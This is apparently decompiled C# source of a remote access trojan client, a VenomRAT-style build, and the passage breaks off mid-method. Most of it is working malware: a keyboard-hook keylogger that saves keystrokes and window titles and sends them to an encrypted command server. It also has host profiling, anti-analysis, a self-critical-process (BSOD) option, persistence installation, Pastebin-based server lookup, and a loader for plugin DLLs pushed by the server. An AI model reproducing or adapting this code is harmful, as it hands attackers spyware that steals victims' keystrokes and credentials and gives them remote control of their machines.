using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using System.Runtime.Versioning;
using System.Security.Authentication;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Security.Permissions;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Client.Algorithm;
using Client.Connection;
using Client.Helper;
using Client.Install;
using MessagePackLib.MessagePack;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using Params;

[assembly: CompilationRelaxations(8)]
[assembly: RuntimeCompatibility(WrapNonExceptionThrows = true)]
[assembly: Debuggable(DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints)]
[assembly: AssemblyTitle("")]
[assembly: AssemblyDescription("")]
[assembly: AssemblyConfiguration("")]
[assembly: AssemblyCompany("")]
[assembly: AssemblyProduct("")]
[assembly: AssemblyCopyright("")]
[assembly: AssemblyTrademark("")]
[assembly: AssemblyFileVersion("6.0.1")]
[assembly: TargetFramework(".NETFramework,Version=v4.0", FrameworkDisplayName = ".NET Framework 4")]
[assembly: ComVisible(false)]
[assembly: AssemblyVersion("6.0.1.0")]
namespace Params
{
	public class KeylogParams
	{
		public static string KeylogConfFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "MyData", "DataLogs.conf");

		public static string OfflineSaveFileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "MyData", "DataLogs_keylog_offline.txt");

		public static string OnlineSaveFileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "MyData", "DataLogs_keylog_online.txt");

		public const string KeylogMutexString = "OfflineKeylogger";

		public string filter { get; set; } = string.Empty;

		public int interval { get; set; } = 5;

		public bool isEnabled { get; set; }

		public List<string> filters
		{
			get
			{
				try
				{
					return new List<string>(filter.Split(new char[1] { ' ' }, StringSplitOptions.RemoveEmptyEntries));
				}
				catch
				{
				}
				return new List<string>();
			}
		}

		public string content
		{
			get
			{
				return $"{filter}\n{interval}\n{isEnabled}";
			}
			set
			{
				try
				{
					string[] array = value.Split(new char[1] { '\n' });
					filter = array[0];
					interval = Convert.ToInt32(array[1]);
					if (interval == 0)
					{
						interval = 5;
					}
					isEnabled = Convert.ToBoolean(array[2]);
				}
				catch
				{
					filter = string.Empty;
					interval = 5;
					isEnabled = false;
				}
			}
		}

		public void LoadFromFile()
		{
			if (File.Exists(KeylogConfFile))
			{
				content = File.ReadAllText(KeylogConfFile);
			}
			else
			{
				SaveToFile();
			}
		}

		public void SaveToFile()
		{
			File.Delete(KeylogConfFile);
			File.AppendAllText(KeylogConfFile, content);
		}
	}
}
namespace Client
{
	public class CGRInfo
	{
		public static string GetCPUName()
		{
			//IL_000b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0011: Expected O, but got Unknown
			//IL_0028: Unknown result type (might be due to invalid IL or missing references)
			//IL_002e: Expected O, but got Unknown
			string text = "";
			ManagementObjectSearcher val = new ManagementObjectSearcher("Select * from Win32_Processor");
			try
			{
				ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
						ManagementObject val2 = (ManagementObject)enumerator.Current;
						text += string.Format("{0} ({1} Core) ", ((ManagementBaseObject)val2)["Name"], ((ManagementBaseObject)val2)["NumberOfCores"]);
					}
					return text;
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}

		public static string GetRAM()
		{
			//IL_000b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0011: Expected O, but got Unknown
			string text = "";
			ManagementObjectSearcher val = new ManagementObjectSearcher("Select * From Win32_ComputerSystem");
			try
			{
				ManagementObject val2 = ((IEnumerable)val.Get()).OfType<ManagementObject>().FirstOrDefault();
				return text + ((Convert.ToDouble(((ManagementBaseObject)val2)["TotalPhysicalMemory"]) / 1073741824.0 > 1.0) ? Math.Ceiling(Convert.ToDouble(((ManagementBaseObject)val2)["TotalPhysicalMemory"]) / 1073741824.0).ToString() : (Convert.ToDouble(((ManagementBaseObject)val2)["TotalPhysicalMemory"]) / 1073741824.0).ToString()) + " GB ";
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}

		public static string GetGPU()
		{
			//IL_000b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0026: Unknown result type (might be due to invalid IL or missing references)
			//IL_002c: Expected O, but got Unknown
			string result = "";
			try
			{
				ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("select * from Win32_VideoController").Get().GetEnumerator();
				try
				{
					if (enumerator.MoveNext())
					{
						ManagementObject val = (ManagementObject)enumerator.Current;
						result = string.Format("{0} v{1}", ((ManagementBaseObject)val)["Name"], ((ManagementBaseObject)val)["DriverVersion"]);
						return result;
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
			}
			catch
			{
			}
			return result;
		}

		public static string GetInstalledApplications()
		{
			List<RegistryKey> obj = new List<RegistryKey>
			{
				Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"),
				Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"),
				Registry.LocalMachine.OpenSubKey("SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall")
			};
			List<string> list = new List<string>();
			foreach (RegistryKey item2 in obj)
			{
				string[] subKeyNames = item2.GetSubKeyNames();
				foreach (string name in subKeyNames)
				{
					using RegistryKey registryKey = item2.OpenSubKey(name);
					try
					{
						string item = registryKey.GetValue("DisplayName").ToString();
						string text = registryKey.GetValue("UninstallString").ToString();
						if (!string.IsNullOrEmpty(registryKey.GetValue("InstallLocation").ToString()) && !text.ToLower().StartsWith("msiexec.exe"))
						{
							list.Add(item);
						}
					}
					catch
					{
					}
				}
			}
			string text2 = string.Empty;
			foreach (string item3 in list)
			{
				text2 = text2 + ";" + item3;
			}
			return text2;
		}

		public static string GetUserProcessList()
		{
			string text = string.Empty;
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				if (process.MainWindowHandle != IntPtr.Zero)
				{
					text = text + process.ProcessName + ",";
				}
			}
			return text;
		}
	}
	public static class Keylogger
	{
		private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

		private static string PrevActiveWindowTitle;

		public static KeylogParams Params = new KeylogParams();

		private const int WM_KEYDOWN = 256;

		private static LowLevelKeyboardProc _proc = HookCallback;

		private static IntPtr _hookID = IntPtr.Zero;

		private static int WHKEYBOARDLL = 13;

		public static void SendLog()
		{
			try
			{
				string text = string.Empty;
				if (File.Exists(KeylogParams.OnlineSaveFileName))
				{
					text = File.ReadAllText(KeylogParams.OnlineSaveFileName);
				}
				if (ClientSocket.IsConnected && !string.IsNullOrEmpty(text))
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "keyLogger";
					msgPack.ForcePathObject("hwid").AsString = Settings.Hw_id;
					msgPack.ForcePathObject("log").AsString = text;
					ClientSocket.Send(msgPack.Encode2Bytes());
					File.Delete(KeylogParams.OnlineSaveFileName);
				}
			}
			catch
			{
			}
		}

		public static void Run()
		{
			new Thread((ThreadStart)delegate
			{
				while (true)
				{
					Thread.Sleep(Params.interval * 1000);
					SendLog();
				}
			}).Start();
			_hookID = SetHook(_proc);
		}

		private static IntPtr SetHook(LowLevelKeyboardProc proc)
		{
			using Process process = Process.GetCurrentProcess();
			return SetWindowsHookEx(WHKEYBOARDLL, proc, GetModuleHandle(process.ProcessName), 0u);
		}

		private static string KeyboardLayout(uint vkCode)
		{
			//IL_0063: Unknown result type (might be due to invalid IL or missing references)
			try
			{
				StringBuilder stringBuilder = new StringBuilder();
				byte[] lpKeyState = new byte[256];
				if (!GetKeyboardState(lpKeyState))
				{
					return "";
				}
				uint wScanCode = MapVirtualKey(vkCode, 0u);
				IntPtr keyboardLayout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), out var _));
				ToUnicodeEx(vkCode, wScanCode, lpKeyState, stringBuilder, 5, 0u, keyboardLayout);
				return stringBuilder.ToString();
			}
			catch
			{
			}
			return ((object)(Keys)vkCode/*cast due to constrained. prefix*/).ToString();
		}

		private static bool FilterProcessWindow(string proc, string wintitle)
		{
			if (Params.filters.Count == 0)
			{
				return true;
			}
			foreach (string filter in Params.filters)
			{
				string value = filter.ToLower();
				if (proc.ToLower().Contains(value) || wintitle.ToLower().Contains(value))
				{
					return true;
				}
			}
			return false;
		}

		private static string GetActiveProcessName()
		{
			GetWindowThreadProcessId(GetForegroundWindow(), out var lpdwProcessId);
			string result = string.Empty;
			Process processById = Process.GetProcessById((int)lpdwProcessId);
			if (processById != null)
			{
				result = processById.ProcessName;
			}
			return result;
		}

		private unsafe static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
		{
			//IL_00c5: Unknown result type (might be due to invalid IL or missing references)
			//IL_00c7: Unknown result type (might be due to invalid IL or missing references)
			//IL_00cb: Invalid comparison between Unknown and I4
			//IL_0171: Unknown result type (might be due to invalid IL or missing references)
			//IL_00d0: Unknown result type (might be due to invalid IL or missing references)
			//IL_00d7: Invalid comparison between Unknown and I4
			//IL_019b: Unknown result type (might be due to invalid IL or missing references)
			//IL_019f: Invalid comparison between Unknown and I4
			//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
			//IL_01ab: Unknown result type (might be due to invalid IL or missing references)
			//IL_01af: Invalid comparison between Unknown and I4
			try
			{
				if (nCode >= 0 && wParam == (IntPtr)256)
				{
					string activeProcessName = GetActiveProcessName();
					string activeWindowTitle = GetActiveWindowTitle();
					if (!Params.isEnabled || !FilterProcessWindow(activeProcessName, activeWindowTitle))
					{
						return CallNextHookEx(_hookID, nCode, wParam, lParam);
					}
					int num = Marshal.ReadInt32(lParam);
					bool num2 = (GetKeyState(20) & 0xFFFF) != 0;
					bool flag = (GetKeyState(160) & 0x8000) != 0 || (GetKeyState(161) & 0x8000) != 0;
					string text = KeyboardLayout((uint)num);
					text = ((!(num2 | flag)) ? text.ToLower() : text.ToUpper());
					Keys val = (Keys)num;
					if ((int)val >= 112 && (int)val <= 135)
					{
						text = "[" + ((object)(Keys)num/*cast due to constrained. prefix*/).ToString() + "]";
					}
					else
					{
						if (((IEnumerable<Keys>)(object)new Keys[17]
						{
							(Keys)27,
							(Keys)8,
							(Keys)9,
							(Keys)20,
							(Keys)91,
							(Keys)92,
							(Keys)164,
							(Keys)165,
							(Keys)162,
							(Keys)163,
							(Keys)37,
							(Keys)39,
							(Keys)38,
							(Keys)40,
							(Keys)46,
							(Keys)36,
							(Keys)35
						}).Contains(val))
						{
							text = "[" + ((object)(*(Keys*)(&val))/*cast due to constrained. prefix*/).ToString() + "]";
						}
						if ((int)val == 13)
						{
							text = "[Enter]\r\n";
						}
						if ((int)val == 32)
						{
							text = " ";
						}
					}
					if (!string.IsNullOrEmpty(text))
					{
						StringBuilder stringBuilder = new StringBuilder();
						if (PrevActiveWindowTitle == activeWindowTitle)
						{
							stringBuilder.Append(text);
						}
						else
						{
							stringBuilder.Append(Environment.NewLine);
							stringBuilder.Append(Environment.NewLine);
							stringBuilder.Append("----- [" + DateTime.Now.ToString("MM-dd HH:mm:ss") + "] : [" + activeProcessName + "] [" + activeWindowTitle + "]");
							stringBuilder.Append(Environment.NewLine);
							stringBuilder.Append(text);
						}
						Log(stringBuilder.ToString());
						PrevActiveWindowTitle = activeWindowTitle;
					}
				}
				return CallNextHookEx(_hookID, nCode, wParam, lParam);
			}
			catch
			{
				return IntPtr.Zero;
			}
		}

		private static void Log(string log)
		{
			if (Params.isEnabled)
			{
				File.AppendAllText(KeylogParams.OfflineSaveFileName, log);
				if (ClientSocket.IsConnected)
				{
					File.AppendAllText(KeylogParams.OnlineSaveFileName, log);
				}
			}
		}

		private static string GetActiveWindowTitle()
		{
			try
			{
				GetWindowThreadProcessId(GetForegroundWindow(), out var lpdwProcessId);
				Process processById = Process.GetProcessById((int)lpdwProcessId);
				string text = processById.MainWindowTitle;
				if (string.IsNullOrWhiteSpace(text))
				{
					text = processById.ProcessName;
				}
				return text;
			}
			catch (Exception)
			{
				return "???";
			}
		}

		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool UnhookWindowsHookEx(IntPtr hhk);

		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr GetModuleHandle(string lpModuleName);

		[DllImport("user32.dll")]
		private static extern IntPtr GetForegroundWindow();

		[DllImport("user32.dll", SetLastError = true)]
		private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

		[DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
		public static extern short GetKeyState(int keyCode);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool GetKeyboardState(byte[] lpKeyState);

		[DllImport("user32.dll")]
		private static extern IntPtr GetKeyboardLayout(uint idThread);

		[DllImport("user32.dll")]
		private static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out][MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

		[DllImport("user32.dll")]
		private static extern uint MapVirtualKey(uint uCode, uint uMapType);
	}
	public class Program
	{
		[STAThread]
		public static void Main()
		{
			Directory.CreateDirectory(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "MyData"));
			Keylogger.Params.LoadFromFile();
			ServicePointManager.Expect100Continue = true;
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
			ServicePointManager.DefaultConnectionLimit = 9999;
			for (int i = 0; i < Convert.ToInt32(Settings.De_lay); i++)
			{
				Thread.Sleep(1000);
			}
			if (!Settings.InitializeSettings())
			{
				Environment.Exit(0);
			}
			SetRegistry.InitRegistry();
			try
			{
				if (Convert.ToBoolean(Settings.An_ti))
				{
					Anti_Analysis.RunAntiAnalysis();
				}
			}
			catch
			{
			}
			A.B();
			try
			{
				if (!MutexControl.CreateMutex())
				{
					Environment.Exit(0);
				}
			}
			catch
			{
			}
			try
			{
				if (Convert.ToBoolean(Settings.Anti_Process))
				{
					AntiProcess.StartBlock();
				}
			}
			catch
			{
			}
			try
			{
				if (Convert.ToBoolean(Settings.BS_OD) && Methods.IsAdmin())
				{
					ProcessCritical.Set();
				}
			}
			catch
			{
			}
			try
			{
				if (Convert.ToBoolean(Settings.In_stall))
				{
					NormalStartup.Install();
				}
			}
			catch
			{
			}
			Methods.PreventSleep();
			try
			{
				if (Methods.IsAdmin())
				{
					Methods.ClearSetting();
				}
			}
			catch
			{
			}
			new Thread((ThreadStart)delegate
			{
				while (true)
				{
					try
					{
						if (!ClientSocket.IsConnected)
						{
							StopHVNC();
							ClientSocket.Reconnect();
							ClientSocket.InitializeClient();
						}
					}
					catch
					{
					}
					Thread.Sleep(3000);
				}
			}).Start();
			Keylogger.Run();
			Application.Run();
		}

		public static void StopHVNC()
		{
			Process[] processesByName = Process.GetProcessesByName("cvtres");
			foreach (Process process in processesByName)
			{
				process.Kill();
				process.WaitForExit();
				process.Dispose();
			}
		}
	}
	public class Logger
	{
		public static void Log(string msg)
		{
			try
			{
				File.AppendAllText("C://Temp//1.log", msg);
			}
			catch
			{
			}
		}
	}
	public static class Settings
	{
		public static KeylogParams keylogparam = new KeylogParams();

		public static string Por_ts = "/GAP9C1xPJ7IlP6MYsj77Kdf7p+qTh5yBvcex4/z/nBOiJFC1G62ZybbX37ftaw+PEw14z6rWvj/HMeiEew8mQ==";

		public static string Hos_ts = "S8l/KKqx5GrcphexFg5i/inDnNVshzTqBK2ADAmqK6huMPrjWvRwLfbsoNH/sUEBUd9hrOB/+uhBx9bPXexpOQ==";

		public static string Ver_sion = "7BCUDc4OlJ/FKROC2UNO6TtO5R+E1kfFgewH/2b0eGWAy07lCeCHgf6lqihscqJetOtS8rUlXwVZcylz7T5Djcm7dJ8GpC/7d9WWd/VaA4rQECxYEbzyZmN18N/j1CYm";

		public static string In_stall = "mxC+WDOE5hhhwCj2kL7RLTtdKp6GJwk2pLXjW9S2HlVXCii4cljhByv7lImKp2LbrwZ4Qz2DsBG46tCOWBxUjQ==";

		public static string Install_Folder = "%AppData%";

		public static string Install_File = "";

		public static string Key = "RHJwOEgybnExMWQzWW9jaEc3THh4dWdKNlpoYml0YUs=";

		public static string MTX = "UJYK6nrIjrDo6JxLjJipLlRDWJEfL/lK09atLcC3IifL+yZHlYpWgWu8Zt3iqVZLzW54l3gaxVHpoDb0uy7awvV+5OrjKnYANv0EIMhiT78=";

		public static string Certifi_cate = "8oioz3V/x/mMjcTC8D6VkDTNBYEY7sYkjVazLmr4Q1YameUZvgHPNGzV66U1XAmTrTB6kiTbeUO3HMlIxjYvANaxpp/Bzte2wRuF3V2YQHlY0Y4l02G3yCpqwsVWf3vrTlL0eiGt+G/qNJ410i1w3XgluPzXdNtkSP/dQyYk0Zs9YzDSOi0vOZyvtZ2NNk6UokAN2SQi09CXt51PF9n7A/EaeNk88ZrTBKMMrvuSp41RoZkeNrHCSZHBPZbjt4S6Gs2Iz+8qFU66pTzHzkYlwiKy91NCFSQzrpUjSM+xtzdMSafBg2KYa5mFIH1X3eG0zQGTNKiym95rsqDDF4vUHAA55ISP2yWOrBcV8VwjHQrnzia7ZFjsgERo31OO4VdNDEJpbkTVYXxhDl2h9xJsla51gUdx9iiAtsLO0WrfWnJknC1Y+r9pJp6ctcNUllhlhKOkOB1ioW6pTzOkxwZ8wpQvzVIhQyx107eN3Be8vSW3lBMV0dMRHxm3hbi8/UScAWpExo1ht4PxQZ8HPBxzr800OZ7DFwYAyRpH9kBKjpBwDnZBWDdLzllRurscn5QGMiE4wgPNSpvmQpK11q64jFR3r8rBGbX7aS0H/IV8h4d02DEgcP1SVog/ZaSPloynednpMlQYDAwvjjyw+pBU0KqXdIvEQgIiqWw7KXTKfM4LBHyUaEhXVIcjViV4y45EXIfky9czZqIr7bLdwEdYFgRxQ7adQSzuAB9WAqu2YuBzac1SXoT576w04S49VNHSH4JL96e1AxD+DO6l2w+06gnFLsgGQSdgR/bHXgPEH2/lNgTqZ42mMSdgrk6SCAUgz+b1GxnwX8B3ZGHv+5ZF0YAtLyq8rUYUXUiKqWc7ui0O2PXD+bfDDfJiRHm6FzNvoYYj0kSCrJw9LpAwXsOvmsAZ5Ol09jhcnzGqbjxEE8a3WYzMDmT90cgu3VV1yuS36t7LWeUJBo9tMjaPpEIrkIvTvPSg554X9h6O05KXxOK5u2qLTYtMxM+VUK3HRTtSVkefJ3k7Z2JTDjbUDfqYzPYbVJXt5Y/PNHCnqyX0/ycS1JOmXN1Thj4/zgDj4DFF";

		public static string Server_signa_ture = "b4HOn9/D0dj0JiD/nCJrPABwXAcLlNYzDmKo6TBdh8w6YaZkHCfRyWUHZYC251vgP7m9XXKtKJRSlii5PiDaoep153RXS0/WTtLy6/Jyr844p1P4xgyDUi1jHmzbh0xgN0g0GNpg5x/BGtAsrgnVeDWQvlcdiR+zUW8Uvemr67IrZTnazOU9+RWFF5Vr/Bty9tLNeayJCYt9fTxpkzIkC9BQfMeHkyiDBRmW5VbYDJlSFTldccbuXfGPi3fYhHgh9vo+eIScP211xJG/2iaZN26UJDYmitFH/sVS49IdQ5s=";

		public static X509Certificate2 Server_Certificate;

		public static Aes256 aes256;

		public static string Paste_bin = "8v6pvSHxeq/qW6K4PiD7GBsf6aU221MpjBRFDhsAyAlsQ8fOnZcPWJPED9Ow0cjNWW2YNWEFDU3+RfdLBFtOyw==";

		public static string BS_OD = "vSX9m+cl7uYCwRs10UY7ayhmCt28Wumv2s+Ac4Pp0LMHas95i/uWQfOMUC0pv7vsNsZiJ8WLzVjzNGroopBzaQ==";

		public static string Hw_id = null;

		public static string De_lay = "1";

		public static string Group = "SoYQ2RTfCJgAQHfslZShZ6R6yFkE6puaRDZHRk8Wos6IE7uJyOR6daO78wU+h34/kmg/ZVcxUgVe37rCXofRSQ==";

		public static string Anti_Process = "YxZupSUUZ5TksYXtKLGseos4fNu+2Tm9r41g0q/lqb5ercV4lYGRrOZkFCWKPDd2svMO/VtiBRgpWtqFF66MBA==";

		public static string An_ti = "wi7iXKqQsnZl0u7+teai87Q4F/Oy9NnFNUun4cq9K8rD8BYUYR9BVNql6ohOWK1twJhMtZxqJHyo/btHXxmtgA==";

		public static bool InitializeSettings()
		{
			try
			{
				Key = Encoding.UTF8.GetString(Convert.FromBase64String(Key));
				aes256 = new Aes256(Key);
				Por_ts = aes256.Decrypt(Por_ts);
				Hos_ts = aes256.Decrypt(Hos_ts);
				Ver_sion = aes256.Decrypt(Ver_sion);
				In_stall = aes256.Decrypt(In_stall);
				MTX = aes256.Decrypt(MTX);
				Paste_bin = aes256.Decrypt(Paste_bin);
				An_ti = aes256.Decrypt(An_ti);
				Anti_Process = aes256.Decrypt(Anti_Process);
				BS_OD = aes256.Decrypt(BS_OD);
				Group = aes256.Decrypt(Group);
				Hw_id = HwidGen.HWID();
				Server_signa_ture = aes256.Decrypt(Server_signa_ture);
				Server_Certificate = new X509Certificate2(Convert.FromBase64String(aes256.Decrypt(Certifi_cate)));
				return VerifyHash();
			}
			catch
			{
				return false;
			}
		}

		private static bool VerifyHash()
		{
			try
			{
				RSACryptoServiceProvider rSACryptoServiceProvider = (RSACryptoServiceProvider)Server_Certificate.PublicKey.Key;
				using SHA256Managed sHA256Managed = new SHA256Managed();
				return rSACryptoServiceProvider.VerifyHash(sHA256Managed.ComputeHash(Encoding.UTF8.GetBytes(Key)), CryptoConfig.MapNameToOID("SHA256"), Convert.FromBase64String(Server_signa_ture));
			}
			catch (Exception)
			{
				return false;
			}
		}
	}
}
namespace Client.Connection
{
	public static class ClientSocket
	{
		public static List<MsgPack> Packs = new List<MsgPack>();

		public static Socket TcpClient { get; set; }

		public static SslStream SslClient { get; set; }

		private static byte[] Buffer { get; set; }

		private static long HeaderSize { get; set; }

		private static long Offset { get; set; }

		private static Timer KeepAlive { get; set; }

		public static bool IsConnected { get; set; }

		private static object SendSync { get; } = new object();

		private static Timer Ping { get; set; }

		public static int Interval { get; set; }

		public static bool ActivatePo_ng { get; set; }

		public static void InitializeClient()
		{
			try
			{
				TcpClient = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
				{
					ReceiveBufferSize = 51200,
					SendBufferSize = 51200
				};
				if (Settings.Paste_bin == "null")
				{
					string text = Settings.Hos_ts.Split(new char[1] { ',' })[new Random().Next(Settings.Hos_ts.Split(new char[1] { ',' }).Length)];
					int port = Convert.ToInt32(Settings.Por_ts.Split(new char[1] { ',' })[new Random().Next(Settings.Por_ts.Split(new char[1] { ',' }).Length)]);
					if (IsValidDomainName(text))
					{
						IPAddress[] hostAddresses = Dns.GetHostAddresses(text);
						foreach (IPAddress address in hostAddresses)
						{
							try
							{
								TcpClient.Connect(address, port);
								if (TcpClient.Connected)
								{
									break;
								}
							}
							catch
							{
							}
						}
					}
					else
					{
						TcpClient.Connect(text, port);
					}
				}
				else
				{
					using WebClient webClient = new WebClient();
					NetworkCredential credentials = new NetworkCredential("", "");
					webClient.Credentials = credentials;
					string[] array = webClient.DownloadString(Settings.Paste_bin).Split(new string[1] { ":" }, StringSplitOptions.None);
					Settings.Hos_ts = array[0];
					Settings.Por_ts = array[new Random().Next(1, array.Length)];
					TcpClient.Connect(Settings.Hos_ts, Convert.ToInt32(Settings.Por_ts));
				}
				if (TcpClient.Connected)
				{
					IsConnected = true;
					SslClient = new SslStream(new NetworkStream(TcpClient, ownsSocket: true), leaveInnerStreamOpen: false, ValidateVenomServer);
					SslClient.AuthenticateAsClient(TcpClient.RemoteEndPoint.ToString().Split(new char[1] { ':' })[0], null, SslProtocols.Tls, checkCertificateRevocation: false);
					HeaderSize = 4L;
					Buffer = new byte[HeaderSize];
					Offset = 0L;
					Send(IdSender.SendInfo());
					Interval = 0;
					ActivatePo_ng = false;
					KeepAlive = new Timer(KeepAlivePacket, null, new Random().Next(10000, 15000), new Random().Next(10000, 15000));
					Ping = new Timer(Po_ng, null, 1, 1);
					SslClient.BeginRead(Buffer, (int)Offset, (int)HeaderSize, ReadServertData, null);
				}
				else
				{
					IsConnected = false;
				}
			}
			catch
			{
				IsConnected = false;
			}
		}

		private static bool IsValidDomainName(string name)
		{
			return Uri.CheckHostName(name) != UriHostNameType.Unknown;
		}

		private static bool ValidateVenomServer(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
		{
			return Settings.Server_Certificate.Equals(certificate);
		}

		public static void Reconnect()
		{
			try
			{
				Ping?.Dispose();
				KeepAlive?.Dispose();
				SslClient?.Dispose();
				TcpClient?.Dispose();
			}
			catch
			{
			}
			IsConnected = false;
		}

		public static void ReadServertData(IAsyncResult ar)
		{
			try
			{
				if (!TcpClient.Connected || !IsConnected)
				{
					IsConnected = false;
					return;
				}
				int num = SslClient.EndRead(ar);
				if (num > 0)
				{
					Offset += num;
					HeaderSize -= num;
					if (HeaderSize == 0L)
					{
						HeaderSize = BitConverter.ToInt32(Buffer, 0);
						if (HeaderSize > 0)
						{
							Offset = 0L;
							Buffer = new byte[HeaderSize];
							while (HeaderSize > 0)
							{
								int num2 = SslClient.Read(Buffer, (int)Offset, (int)HeaderSize);
								if (num2 <= 0)
								{
									IsConnected = false;
									return;
								}
								Offset += num2;
								HeaderSize -= num2;
								if (HeaderSize < 0)
								{
									IsConnected = false;
									return;
								}
							}
							new Thread(Read).Start(Buffer);
							Offset = 0L;
							HeaderSize = 4L;
							Buffer = new byte[HeaderSize];
						}
						else
						{
							HeaderSize = 4L;
							Buffer = new byte[HeaderSize];
							Offset = 0L;
						}
					}
					else if (HeaderSize < 0)
					{
						IsConnected = false;
						return;
					}
					SslClient.BeginRead(Buffer, (int)Offset, (int)HeaderSize, ReadServertData, null);
				}
				else
				{
					IsConnected = false;
				}
			}
			catch
			{
				IsConnected = false;
			}
		}

		public static void Send(byte[] msg)
		{
			lock (SendSync)
			{
				try
				{
					if (!IsConnected)
					{
						return;
					}
					byte[] bytes = BitConverter.GetBytes(msg.Length);
					TcpClient.Poll(-1, SelectMode.SelectWrite);
					SslClient.Write(bytes, 0, bytes.Length);
					if (msg.Length > 1000000)
					{
						using (MemoryStream memoryStream = new MemoryStream(msg))
						{
							int num = 0;
							memoryStream.Position = 0L;
							byte[] array = new byte[50000];
							while ((num = memoryStream.Read(array, 0, array.Length)) > 0)
							{
								TcpClient.Poll(-1, SelectMode.SelectWrite);
								SslClient.Write(array, 0, num);
								SslClient.Flush();
							}
							return;
						}
					}
					TcpClient.Poll(-1, SelectMode.SelectWrite);
					SslClient.Write(msg, 0, msg.Length);
					SslClient.Flush();
				}
				catch
				{
					IsConnected = false;
				}
			}
		}

		public static void KeepAlivePacket(object obj)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "Ping";
				msgPack.ForcePathObject("Message").AsString = Methods.GetActiveWindowTitle();
				Send(msgPack.Encode2Bytes());
				GC.Collect();
				ActivatePo_ng = true;
			}
			catch
			{
			}
		}

		private static void Po_ng(object obj)
		{
			try
			{
				if (ActivatePo_ng && IsConnected)
				{
					Interval++;
				}
			}
			catch
			{
			}
		}

		public static void Read(object data)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.DecodeFromBytes((byte[])data);
				switch (msgPack.ForcePathObject("Pac_ket").AsString)
				{
				case "init_reg":
				{
					SetRegistry.InitRegistry();
					MsgPack msgPack7 = new MsgPack();
					msgPack7.ForcePathObject("Pac_ket").SetAsString("init_reg");
					Send(msgPack7.Encode2Bytes());
					break;
				}
				case "loadofflinelog":
				{
					string text = "";
					if (File.Exists(KeylogParams.OfflineSaveFileName))
					{
						text = File.ReadAllText(KeylogParams.OfflineSaveFileName);
						File.Delete(KeylogParams.OfflineSaveFileName);
					}
					Logger.Log("\nOfflineKeylog sending....\n" + text);
					MsgPack msgPack6 = new MsgPack();
					msgPack6.ForcePathObject("Pac_ket").SetAsString("offlinelog");
					msgPack6.ForcePathObject("log").SetAsString(text);
					Send(msgPack6.Encode2Bytes());
					break;
				}
				case "Po_ng":
				{
					ActivatePo_ng = false;
					MsgPack msgPack5 = new MsgPack();
					msgPack5.ForcePathObject("Pac_ket").SetAsString("Po_ng");
					msgPack5.ForcePathObject("Message").SetAsInteger(Interval);
					Send(msgPack5.Encode2Bytes());
					Interval = 0;
					break;
				}
				case "plu_gin":
					try
					{
						string asString = msgPack.ForcePathObject("Dll").AsString;
						if (SetRegistry.GetValue(asString) == null)
						{
							Packs.Add(msgPack);
							MsgPack msgPack4 = new MsgPack();
							msgPack4.ForcePathObject("Pac_ket").SetAsString("sendPlugin");
							msgPack4.ForcePathObject("Hashes").SetAsString(asString);
							Send(msgPack4.Encode2Bytes());
						}
						else
						{
							Invoke(msgPack);
						}
						break;
					}
					catch (Exception ex)
